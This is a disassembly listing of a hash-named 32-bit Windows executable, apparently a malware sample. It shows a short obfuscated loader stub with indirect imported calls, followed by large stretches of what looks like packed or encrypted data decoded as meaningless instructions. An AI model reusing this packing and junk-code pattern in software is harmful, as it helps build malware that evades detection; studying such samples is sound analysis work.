
7129db93618472196c6d7c5a8e8c8f794f0643c821f7012ba5f9f0fbb3bae8ea.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428237,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x4282df,0x0
  401016:	mov    DWORD PTR ds:0x4282af,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x4281ff,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x4282df,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d34
  40104b:	mov    ecx,DWORD PTR ds:0x428367
  401051:	sub    DWORD PTR ds:0x42821b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428247
  40105e:	and    DWORD PTR ds:0x428203,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42818f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428287
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42833f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42826b
  401089:	mov    edx,DWORD PTR ds:0x42836b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282cf,ebx
  40109a:	and    DWORD PTR ds:0x428217,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x66befcb3]
  4010b6:	mov    ah,0xa5
  4010b8:	mov    esp,0x18181818
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [eax-0x3f1ebf91],cl
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	adc    BYTE PTR [ecx+0x17f9da10],dh
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    edx,ecx
  40111b:	mov    al,ds:0x8d891e2c
  401120:	mov    edi,0xa3246513
  401125:	sbb    eax,0xb7aed54e
  40112a:	push   ebx
  40112b:	xlat   BYTE PTR ds:[ebx]
  40112c:	fist   DWORD PTR [edi]
  40112e:	pop    ebx
  40112f:	inc    esp
  401130:	add    BYTE PTR [ebp-0x3c],al
  401133:	dec    edi
  401134:	adc    BYTE PTR gs:[esi-0xc],0x2d
  401139:	fadd   DWORD PTR [esi+ecx*1+0x6c]
  40113d:	cmp    DWORD PTR [edx+0x35ae800c],esi
  401143:	cmp    edx,eax
  401145:	into   
  401146:	push   ss
  401147:	add    eax,0x349c04e9
  40114c:	xchg   esp,eax
  40114d:	mov    ss,edx
  40114f:	xchg   esi,eax
  401150:	leave  
  401151:	sbb    DWORD PTR [edi],edi
  401153:	mov    bl,0xea
  401155:	ja     0x4011d6
  401157:	inc    ebp
  401158:	jae    0x4010ee
  40115a:	or     eax,0xfd548248
  40115f:	call   0x1b925496
  401164:	xchg   ecx,eax
  401165:	fsub   DWORD PTR cs:[edx+eiz*2]
  401169:	or     BYTE PTR [edx],dl
  40116b:	loop   0x4011b0
  40116d:	xchg   BYTE PTR [eax-0x47],al
  401170:	jg     0x4010f6
  401172:	in     eax,0xb8
  401174:	pop    DWORD PTR [ebx+0x6223afdd]
  40117a:	loope  0x401103
  40117c:	xor    ebp,DWORD PTR [edx-0x40]
  40117f:	data16 rcr BYTE PTR [esi-0x10e94af3],0x8c
  401187:	push   es
  401188:	mov    BYTE PTR [ebp-0x4a5de5cd],bh
  40118e:	test   al,0x10
  401190:	sbb    DWORD PTR [edx],0x4c
  401193:	mov    esp,0x468183ac
  401198:	js     0x4011ec
  40119a:	outs   dx,BYTE PTR ds:[esi]
  40119b:	mov    dh,0xfc
  40119d:	cmp    DWORD PTR [ecx+ebp*2+0x62adad57],0xffffffb4
  4011a5:	(bad)  
  4011a6:	aaa    
  4011a7:	or     eax,0x5d23a40
  4011ac:	fcom   DWORD PTR es:[eax+0x1f2411ff]
  4011b3:	fadd   QWORD PTR [ebx-0x3717c40c]
  4011b9:	add    BYTE PTR [ebp+eax*4-0x55],dh
  4011bd:	popa   
  4011be:	jg     0x4011f4
  4011c0:	push   ecx
  4011c1:	and    bl,dh
  4011c3:	in     eax,dx
  4011c4:	mov    ds:0xe00cfde5,al
  4011c9:	shl    DWORD PTR [edi+ebx*2],1
  4011cc:	scas   eax,DWORD PTR es:[edi]
  4011cd:	xor    BYTE PTR [edi],bh
  4011cf:	nop
  4011d0:	lea    ecx,[eax]
  4011d2:	ss mov bh,0xac
  4011d5:	mov    esp,?
  4011d7:	xchg   esi,eax
  4011d8:	mov    esi,0xa34cd0c7
  4011dd:	pop    ds
  4011de:	mov    bh,0xc4
  4011e0:	outs   dx,DWORD PTR ds:[esi]
  4011e1:	pushf  
  4011e2:	add    BYTE PTR [edi-0x4a982cc8],al
  4011e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011e9:	(bad)  
  4011ea:	xor    DWORD PTR [ebx],ebp
  4011ec:	fs out 0xfb,eax
  4011ef:	sub    cl,bh
  4011f1:	or     al,0x62
  4011f3:	dec    esp
  4011f4:	lods   al,BYTE PTR ds:[esi]
  4011f5:	jp     0x4011cb
  4011f7:	shl    DWORD PTR [edx-0x12],0xf2
  4011fb:	push   ss
  4011fc:	and    ah,ch
  4011fe:	imul   eax,DWORD PTR [edx+0xc76d4aa],0xffffffaa
  401205:	inc    esi
  401206:	fstp   TBYTE PTR [eax]
  401208:	je     0x4011d3
  40120a:	int    0x44
  40120c:	lds    edx,FWORD PTR [ebp-0x1c7d3ce8]
  401212:	add    ebp,DWORD PTR [esi-0x6d]
  401215:	sub    DWORD PTR [eax-0x33],edi
  401218:	pop    ebx
  401219:	fldcw  WORD PTR [ebx+0x25c85f95]
  40121f:	add    edx,DWORD PTR [eax+0x6f8afb4e]
  401225:	imul   DWORD PTR [ecx+ebp*1+0x7ef8edd8]
  40122c:	fbstp  TBYTE PTR [eax]
  40122e:	pop    ebp
  40122f:	daa    
  401230:	pop    esi
  401231:	lods   al,BYTE PTR es:[esi]
  401233:	popa   
  401234:	push   esi
  401235:	fst    QWORD PTR [ebp+0x2]
  401238:	dec    edi
  401239:	loopne 0x401224
  40123b:	test   al,0x4f
  40123d:	mov    ecx,0x7954d66f
  401242:	xchg   al,ah
  401244:	pop    eax
  401245:	(bad)  
  401246:	faddp  st(3),st
  401248:	pushf  
  401249:	push   ebx
  40124a:	mov    al,BYTE PTR [ebp+0x7]
  40124d:	add    DWORD PTR [esi+0x36],edi
  401250:	pop    esp
  401251:	adc    eax,0xec91a9c
  401256:	je     0x401245
  401258:	cmp    esp,esi
  40125a:	popf   
  40125b:	sbb    eax,0x9851d0b2
  401260:	out    0xba,al
  401262:	rcr    BYTE PTR [ebp+0x68],1
  401265:	fidivr WORD PTR [ebx+esi*2+0x16]
  401269:	add    dl,cl
  40126b:	xchg   edx,eax
  40126c:	rcr    DWORD PTR [ebp+0x7b3868de],1
  401272:	stos   BYTE PTR es:[edi],al
  401273:	jno    0x4012b0
  401275:	sti    
  401276:	das    
  401277:	add    esi,DWORD PTR [edi+0x369264e]
  40127d:	bound  ebx,QWORD PTR [ebx+0x44]
  401280:	push   0x73
  401282:	and    eax,0x6c21a8c7
  401287:	nop
  401288:	(bad)  
  401289:	outs   dx,DWORD PTR ds:[esi]
  40128a:	hlt    
  40128b:	mov    esp,0x1c0e36d5
  401290:	cwde   
  401291:	dec    esp
  401292:	push   es
  401293:	jle    0x401268
  401295:	sbb    dh,BYTE PTR [ecx+0x65da5807]
  40129b:	adc    esi,DWORD PTR [edx-0x5a]
  40129e:	dec    ecx
  40129f:	(bad)  
  4012a0:	mov    al,ds:0x5da9be4b
  4012a5:	lea    ecx,[ebx+0x26]
  4012a8:	int3   
  4012a9:	adc    esi,DWORD PTR [eax-0x4c]
  4012ac:	mov    eax,0x3b3d6ec8
  4012b1:	in     eax,dx
  4012b2:	js     0x4012c5
  4012b4:	call   0x244cda56
  4012b9:	xor    al,0xe7
  4012bb:	imul   edx,ebp
  4012be:	mov    ah,0xbd
  4012c0:	mov    al,0xd8
  4012c2:	or     DWORD PTR fs:[edx],0x402f2532
  4012c9:	call   0x70e6:0xf4aee454
  4012d0:	push   edi
  4012d1:	rcr    ebx,1
  4012d3:	gs stos BYTE PTR es:[edi],al
  4012d5:	ret    
  4012d6:	imul   ecx,DWORD PTR [esi-0x5233b170],0x23
  4012dd:	pop    ebp
  4012de:	and    DWORD PTR [ebp-0x18],eax
  4012e1:	(bad)  
  4012e2:	fstp   DWORD PTR [eax-0x80]
  4012e5:	lods   al,BYTE PTR ds:[esi]
  4012e6:	dec    ebx
  4012e7:	(bad)  
  4012e8:	scas   eax,DWORD PTR es:[edi]
  4012e9:	mov    dl,0x6f
  4012eb:	mov    al,ds:0xc0911943
  4012f0:	jae    0x401333
  4012f2:	xchg   BYTE PTR ds:0x679e06b1,bl
  4012f8:	inc    ecx
  4012f9:	mov    ah,0xe4
  4012fb:	dec    edi
  4012fc:	sbb    edx,DWORD PTR [ebx+0x3b16d952]
  401302:	sbb    BYTE PTR [ecx+0x1894d098],bl
  401308:	adc    ebp,DWORD PTR [esi+edx*1-0x1d2bb55d]
  40130f:	bound  edi,QWORD PTR [eax+ebp*1-0x22]
  401313:	ss mov ch,0xbd
  401316:	out    0x57,eax
  401318:	loopne 0x40132d
  40131a:	jge    0x4012f2
  40131c:	rcl    DWORD PTR [ecx-0x65],1
  40131f:	out    dx,eax
  401320:	mov    edi,0x3f98a5f2
  401325:	jmp    0x4012c6
  401327:	inc    esi
  401328:	lods   al,BYTE PTR ss:[esi]
  40132a:	jg     0x40137f
  40132c:	pop    ebp
  40132d:	retf   
  40132e:	or     DWORD PTR [edx-0x68],ecx
  401331:	out    dx,eax
  401332:	dec    esi
  401333:	mov    ds:0x8d0e235a,eax
  401338:	inc    esi
  401339:	xchg   edx,eax
  40133a:	jl     0x40139d
  40133c:	into   
  40133d:	xchg   edx,eax
  40133e:	mov    ecx,DWORD PTR [ebp+0x7f6eb8f2]
  401344:	out    dx,al
  401345:	je     0x4013b2
  401347:	shr    DWORD PTR [ecx-0x5c68a8ac],cl
  40134d:	test   BYTE PTR [eax-0x4c],dl
  401350:	fdivr  QWORD PTR [edi-0x60]
  401353:	or     dh,dl
  401355:	data16 mov al,ds:0x66f6afbd
  40135b:	push   ds
  40135c:	cmp    edi,edi
  40135e:	pop    ecx
  40135f:	inc    eax
  401360:	int    0x88
  401362:	mov    dl,0xc6
  401364:	cmp    dl,BYTE PTR [esi-0x65583566]
  40136a:	test   DWORD PTR [edi],esp
  40136c:	xchg   esi,eax
  40136d:	aad    0x40
  40136f:	and    BYTE PTR [esi+0xa],cl
  401372:	shl    DWORD PTR [edx],0x19
  401375:	jmp    0x4013c1
  401377:	jecxz  0x4013a2
  401379:	or     DWORD PTR [edi-0x1750e6bd],0xffffffb4
  401380:	adc    BYTE PTR [esi],al
  401382:	pop    es
  401383:	(bad)  
  401384:	mov    cl,0xc6
  401386:	sub    DWORD PTR [esi-0x2ace93e5],esp
  40138c:	arpl   WORD PTR [esi],ax
  40138e:	or     esi,0xfffffff7
  401391:	lahf   
  401392:	mov    esp,0xbd30df9a
  401397:	inc    ecx
  401398:	push   ecx
  401399:	sahf   
  40139a:	cmp    BYTE PTR ds:[eax-0x55],dl
  40139e:	frstor [eax]
  4013a0:	mov    eax,ds:0x529f30a
  4013a5:	xchg   ecx,eax
  4013a6:	shl    DWORD PTR [ecx-0x60c2a28f],cl
  4013ac:	mov    ebx,0xec9e9bbe
  4013b1:	push   eax
  4013b2:	push   esi
  4013b3:	test   eax,0x28659aa2
  4013b8:	in     al,0xec
  4013ba:	cmp    eax,0x46beb696
  4013bf:	data16 fild DWORD PTR [edi]
  4013c2:	cmp    al,0x3
  4013c4:	jmp    DWORD PTR [esi-0x6c]
  4013c7:	mov    ecx,DWORD PTR [ebp+0x49ea1954]
  4013cd:	mov    ds:0x9aba3a3a,al
  4013d2:	fs jbe 0x4013ac
  4013d5:	inc    esi
  4013d6:	cmc    
  4013d7:	push   ss
  4013d8:	mov    ds:0xafd2d000,al
  4013dd:	cmp    eax,0x6505fb7a
  4013e2:	dec    ecx
  4013e3:	(bad)
  4013e6:	clc    
  4013e7:	xor    eax,0x69cb3100
  4013ec:	mov    ds:0xb260bfb2,eax
  4013f1:	add    ebx,DWORD PTR [ebx+0x32]
  4013f4:	or     al,0xca
  4013f6:	or     BYTE PTR [eax],ch
  4013f8:	imul   ebp,DWORD PTR [eax+0x1d],0xfb312663
  4013ff:	sub    DWORD PTR [esi+0x1348c846],0xffffff84
  401406:	aad    0x1c
  401408:	push   ss
  401409:	mov    cs,WORD PTR [edi]
  40140b:	out    dx,al
  40140c:	add    esi,DWORD PTR [esi+0x61ce1b79]
  401412:	inc    ebp
  401413:	mov    ds:0xa33b35e6,al
  401418:	call   0x3821e5ba
  40141d:	and    al,0x10
  40141f:	fist   DWORD PTR [edx+0x46666fe3]
  401425:	push   ds
  401426:	fimul  WORD PTR [ecx+ebx*4+0x72]
  40142a:	std    
  40142b:	xchg   ebx,eax
  40142c:	xchg   edx,eax
  40142d:	mov    ds:0x218fd1e6,al
  401432:	(bad)  
  401433:	mov    esp,0x1aed541c
  401438:	lods   al,BYTE PTR ds:[esi]
  401439:	inc    esp
  40143a:	mov    bh,0xdc
  40143c:	icebp  
  40143d:	sbb    esp,DWORD PTR [ebx+edi*2-0x3403a38f]
  401444:	push   eax
  401445:	sbb    al,bl
  401447:	out    dx,al
  401448:	jns    0x401449
  40144a:	pop    ss
  40144b:	or     bh,BYTE PTR [eax+0x397b28a1]
  401451:	add    al,0x5c
  401453:	in     eax,0xbc
  401455:	sbb    al,0xde
  401457:	mov    ah,0x1e
  401459:	test   BYTE PTR [edx],bh
  40145b:	xor    al,0x8b
  40145d:	add    ch,BYTE PTR [edi]
  40145f:	pop    esp
  401460:	xor    esi,DWORD PTR [ebx-0x49]
  401463:	cmp    DWORD PTR [esi-0x5a],0x6db60d72
  40146a:	xchg   esi,eax
  40146c:	pop    ebp
  40146d:	pop    esi
  40146e:	sub    esp,DWORD PTR [esi]
  401470:	ret    
  401471:	or     eax,0x6d762855
  401476:	mov    ebx,0x5fa120f
  40147b:	icebp  
  40147c:	inc    esp
  40147d:	cmp    eax,0xfbfc0c9f
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x42832f,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42826b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282bb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x4281eb,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428213,0x0
  4014da:	mov    DWORD PTR ds:0x4281ef,ecx
  4014e0:	mov    DWORD PTR ds:0x4282b3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42812b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428213,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d38
  40151c:	mov    edx,DWORD PTR ds:0x42828b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428303
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42815f
  401537:	mov    edi,DWORD PTR ds:0x428307
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp+0x33008170]
  401569:	push   0xffffff9e
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi-0x21e7e7ee],bl
  401573:	mov    edx,0x6db52684
  401578:	mov    edi,0x4332f8f8
  40157d:	call   DWORD PTR [edx+0x6e]
  401580:	lods   al,BYTE PTR ds:[esi]
  401581:	jl     0x4015c0
  401583:	imul   edx,DWORD PTR [ecx],0x62
  401586:	pop    esp
  401587:	std    
  401588:	in     eax,dx
  401589:	mov    ch,0x40
  40158c:	cmp    DWORD PTR [eax+0x38],0xf9c5bfb3
  401593:	adc    ebp,eax
  401595:	into   
  401596:	push   esi
  401597:	dec    ecx
  401598:	jge    0x40159a
  40159a:	test   DWORD PTR [edx*2+0x65055e5f],eax
  4015a1:	push   ebp
  4015a2:	fmul   QWORD PTR [ebp+0x25]
  4015a5:	test   DWORD PTR [edx],0x52a1bbd2
  4015ab:	mov    esp,0xa057becb
  4015b0:	mov    bh,BYTE PTR [ebx+0x0]
  4015b3:	stos   BYTE PTR es:[edi],al
  4015b4:	ja     0x40160a
  4015b6:	mov    al,ds:0xa8b98d1a
  4015bb:	push   ebp
  4015bc:	stos   BYTE PTR es:[edi],al
  4015bd:	add    dl,ah
  4015bf:	jb     0x4015cc
  4015c1:	mov    ch,0xf7
  4015c3:	mov    edx,DWORD PTR [ebp-0x171cc0f7]
  4015c9:	xor    ecx,DWORD PTR [ebx-0x31892219]
  4015cf:	test   DWORD PTR [esi-0x26],edx
  4015d2:	sub    bl,bl
  4015d4:	sahf   
  4015d5:	stc    
  4015d6:	sub    ebx,ecx
  4015d8:	mov    edi,0xae412517
  4015dd:	jle    0x401627
  4015df:	add    bh,bl
  4015e1:	(bad)  
  4015e2:	mov    al,0x9d
  4015e4:	int    0xc7
  4015e6:	loope  0x40160d
  4015e8:	mov    edx,0xae645b60
  4015ed:	or     eax,0xfef357e2
  4015f2:	push   esp
  4015f3:	xor    esi,DWORD PTR [edx+edx*1-0x27]
  4015f7:	aaa    
  4015f8:	pop    es
  4015f9:	mov    dl,0xf2
  4015fb:	ret    0xe8f3
  4015fe:	jp     0x4015db
  401600:	pop    es
  401601:	dec    edx
  401602:	cmp    DWORD PTR [ebx-0x5474a86b],ebx
  401608:	and    esp,DWORD PTR ds:[eax+eiz*1-0x3549a84b]
  401610:	mov    ecx,0x87155b18
  401615:	sbb    eax,0x154150e6
  40161a:	xor    al,0x2c
  40161c:	add    BYTE PTR [edi],cl
  40161e:	sub    bl,BYTE PTR [edi]
  401620:	mov    al,0x89
  401622:	add    cl,BYTE PTR [edi+eiz*4+0x3e981801]
  401629:	mov    bl,0x2f
  40162b:	std    
  40162c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40162d:	dec    ebp
  40162e:	out    dx,eax
  40162f:	lahf   
  401630:	jmp    0xd06c:0x1532bf5c
  401637:	and    al,BYTE PTR [ebp-0x1b]
  40163a:	test   BYTE PTR [ebp-0x32],dh
  40163d:	fucomi st,st(5)
  40163f:	mul    DWORD PTR [esi]
  401641:	pop    esi
  401642:	pmaddwd mm5,mm1
  401645:	into   
  401646:	mov    WORD PTR [ebx-0x2a06038f],cs
  40164c:	cmp    BYTE PTR [edi+ebx*1],al
  40164f:	aaa    
  401650:	in     eax,0xf2
  401652:	popf   
  401653:	daa    
  401654:	cmp    BYTE PTR [edx-0x5de64c5],cl
  40165a:	rol    ebp,1
  40165c:	daa    
  40165d:	pop    es
  40165e:	adc    al,0xe
  401660:	push   edx
  401661:	mov    eax,0x7b9e3865
  401666:	test   BYTE PTR [eax-0x6842a2e9],dl
  40166c:	jle    0x401670
  40166e:	gs leave 
  401670:	shl    BYTE PTR [ecx+0x14],cl
  401673:	mov    WORD PTR [edi-0x65ce2cbe],es
  401679:	push   ds
  40167a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40167b:	mov    edi,0xe07613b5
  401680:	jbe    0x401689
  401682:	cmp    dl,BYTE PTR [ecx]
  401684:	les    ecx,FWORD PTR [eax+ebp*8]
  401687:	mov    esi,0xfd3798f
  40168c:	jl     0x401701
  40168e:	mov    ds:0x3a11db8e,eax
  401693:	or     DWORD PTR [ecx+0x29],0xffffff9f
  401697:	jbe    0x4016f4
  401699:	add    DWORD PTR [edx+ebx*4+0x2438e2e3],esp
  4016a0:	mov    ah,0x57
  4016a2:	loope  0x401713
  4016a4:	aaa    
  4016a5:	adc    eax,0xc5799a50
  4016aa:	mov    bl,0x17
  4016ac:	mov    edx,0x55e29546
  4016b1:	add    edi,ecx
  4016b3:	or     edx,DWORD PTR [ebp-0x74]
  4016b6:	cmp    BYTE PTR ss:[ecx],ch
  4016b9:	ss mov esp,0xec90ef30
  4016bf:	sub    al,0x5d
  4016c1:	cmc    
  4016c2:	fwait
  4016c3:	mov    esp,0x4f862b8a
  4016c8:	jmp    FWORD PTR [esi-0x7c]
  4016cb:	fs hlt 
  4016cd:	gs pop ebx
  4016cf:	inc    esp
  4016d0:	shl    al,cl
  4016d2:	in     eax,dx
  4016d3:	sbb    bh,dh
  4016d5:	sbb    ah,ch
  4016d7:	gs scas eax,DWORD PTR es:[edi]
  4016d9:	pop    ebx
  4016da:	and    dh,cl
  4016dc:	sahf   
  4016dd:	push   ecx
  4016de:	jnp    0x401661
  4016e0:	outs   dx,BYTE PTR ds:[esi]
  4016e1:	jecxz  0x401679
  4016e3:	adc    eax,0xa1bac7ee
  4016e8:	ja     0x4016bd
  4016ea:	repz shl ecx,1
  4016ed:	ret    
  4016ee:	daa    
  4016ef:	popf   
  4016f0:	push   ds
  4016f1:	mov    DWORD PTR [edx+0x2b],esp
  4016f4:	outs   dx,DWORD PTR ds:[esi]
  4016f5:	pop    edx
  4016f6:	ss push edx
  4016f8:	dec    ecx
  4016f9:	shr    BYTE PTR [esi-0x252891b2],0xb4
  401700:	fdiv   QWORD PTR [esi+esi*4+0x6f7d2a05]
  401707:	mov    dl,0xcd
  401709:	in     eax,dx
  40170a:	shl    BYTE PTR [eax],0x77
  40170d:	pop    esi
  40170e:	repnz mov al,ds:0x6f8860b3
  401714:	or     ebp,DWORD PTR [esi+ebp*8-0x52]
  401718:	push   ecx
  401719:	xchg   esp,eax
  40171a:	and    ch,cl
  40171c:	sub    DWORD PTR [edi],ebp
  40171e:	lods   al,BYTE PTR ds:[esi]
  40171f:	test   eax,edx
  401721:	mov    bh,0xcf
  401723:	add    edi,DWORD PTR [eax+0x74bcfbaa]
  401729:	(bad)  
  40172a:	lods   eax,DWORD PTR ds:[esi]
  40172b:	push   ebp
  40172c:	pop    esi
  40172d:	fdivr  DWORD PTR [edx+eax*4]
  401730:	jb     0x4017a5
  401732:	cmp    eax,0x480a1008
  401737:	jne    0x4016d2
  401739:	ror    dl,0xb
  40173c:	push   es
  40173d:	mov    BYTE PTR [edx],bl
  40173f:	imul   ecx,DWORD PTR [ecx],0x4ab802be
  401745:	int    0x4
  401747:	jecxz  0x401766
  401749:	rol    DWORD PTR [edx+eax*2-0x59da3562],0xac
  401751:	mov    cl,0x14
  401753:	sbb    al,0xa3
  401756:	out    0x4d,al
  401758:	ror    BYTE PTR [bx],0x3b
  40175c:	inc    ebp
  40175d:	clc    
  40175e:	dec    ebx
  40175f:	ret    
  401760:	xchg   edx,eax
  401761:	jle    0x401707
  401763:	adc    esi,eax
  401765:	jmp    0x4017b5
  401767:	and    eax,0x55b894ef
  40176c:	cmp    DWORD PTR [eax+0xe67a311],0xffffff96
  401773:	mov    bl,0x16
  401775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401776:	ret    0x88a9
  401779:	stc    
  40177a:	add    dl,BYTE PTR [edi+esi*1]
  40177d:	in     eax,0x55
  40177f:	pop    es
  401780:	push   es
  401781:	inc    esp
  401782:	dec    edx
  401783:	sahf   
  401784:	repz jo 0x40172f
  401787:	outs   dx,DWORD PTR ds:[esi]
  401788:	push   es
  401789:	jle    0x4017c8
  40178b:	stos   DWORD PTR es:[edi],eax
  40178c:	sub    BYTE PTR [esi],0x1f
  40178f:	sar    BYTE PTR [edi+edi*8-0x1b],1
  401793:	jge    0x4017d7
  401795:	fwait
  401796:	sub    eax,DWORD PTR [esi+0x39]
  401799:	inc    eax
  40179a:	adc    dl,BYTE PTR [esi+0x64]
  40179d:	(bad)  [ecx]
  40179f:	mov    ebp,0x5c2585ee
  4017a4:	fs popf 
  4017a6:	cs pusha 
  4017a8:	inc    ebp
  4017a9:	push   ecx
  4017aa:	mov    esp,0x23638eaa
  4017af:	xchg   ebp,eax
  4017b0:	inc    eax
  4017b1:	mov    edx,0x74e071e0
  4017b6:	sbb    eax,0x4cd231eb
  4017bb:	xchg   edx,eax
  4017bc:	inc    esi
  4017bd:	adc    DWORD PTR [esi+0xd9bc62c],esp
  4017c3:	sub    bh,al
  4017c5:	sbb    eax,0x7000f644
  4017ca:	test   eax,0x7be44822
  4017cf:	add    ah,dl
  4017d1:	stos   DWORD PTR es:[edi],eax
  4017d2:	cdq    
  4017d3:	mov    ebp,0x8f09996c
  4017d8:	mov    ah,0x4f
  4017da:	and    ch,dl
  4017dc:	sbb    eax,0xed02d740
  4017e1:	out    dx,al
  4017e2:	adc    al,ah
  4017e4:	mov    edx,DWORD PTR [ebx-0x39036a0]
  4017ea:	cli    
  4017eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ec:	jle    0x401794
  4017ee:	mov    edx,0xe9861d7a
  4017f3:	mov    ecx,0x2a0b1e0b
  4017f8:	jb     0x401856
  4017fa:	cwde   
  4017fb:	jns    0x40180b
  4017fd:	push   0x41a9457f
  401802:	test   BYTE PTR [ebp+0x5b05819a],0xc6
  401809:	sbb    eax,0x731e14e
  40180e:	inc    ecx
  40180f:	cmp    ebp,DWORD PTR [ecx-0x57]
  401812:	popa   
  401813:	rol    BYTE PTR [ebp+ebp*8-0xe409e5b],cl
  40181a:	sbb    esp,DWORD PTR [edx-0x7ce1a3ac]
  401820:	add    eax,0x9c3f98d9
  401825:	loop   0x401841
  401827:	mov    esi,0xd39e557b
  40182c:	fdiv   QWORD PTR [ecx]
  40182e:	das    
  40182f:	loopne 0x4017d1
  401831:	sub    DWORD PTR [ebp+0x37],esp
  401834:	push   ecx
  401835:	and    eax,0xabccacc3
  40183a:	inc    esp
  40183b:	sbb    DWORD PTR [ebx+0x49],esp
  40183e:	jne    0x401889
  401840:	icebp  
  401841:	cmp    BYTE PTR [ecx+0x79],cl
  401844:	xchg   esp,eax
  401845:	out    dx,al
  401846:	in     al,dx
  401847:	stos   DWORD PTR es:[edi],eax
  401848:	mov    ebp,DWORD PTR [eax-0xba55460]
  40184e:	iret   
  40184f:	call   0x9f04:0xdc0db3e0
  401856:	aaa    
  401857:	int    0xad
  401859:	inc    edi
  40185a:	stos   BYTE PTR es:[edi],al
  40185b:	retf   
  40185c:	jp     0x4017e3
  40185e:	or     eax,0xc28ee946
  401863:	mov    esp,0xce1f2d7
  401868:	pop    ebx
  401869:	or     BYTE PTR [ebx+0x3c],ch
  40186c:	imul   ebp,DWORD PTR [esi-0x2685a0e1],0x77
  401873:	jne    0x40187e
  401875:	mov    bh,BYTE PTR [ebx-0x1ef14bd6]
  40187b:	mov    ebx,ebx
  40187d:	repnz (bad) 
  40187f:	(bad)  
  401880:	stos   DWORD PTR es:[edi],eax
  401881:	pop    es
  401882:	mov    eax,0x58518b2a
  401887:	ins    BYTE PTR es:[edi],dx
  401888:	in     eax,dx
  401889:	push   edi
  40188a:	adc    eax,0xfa2cb42d
  40188f:	ja     0x401821
  401891:	(bad)  
  401892:	cld    
  401893:	mov    ebx,0x8d9d26eb
  401898:	pop    edx
  401899:	cli    
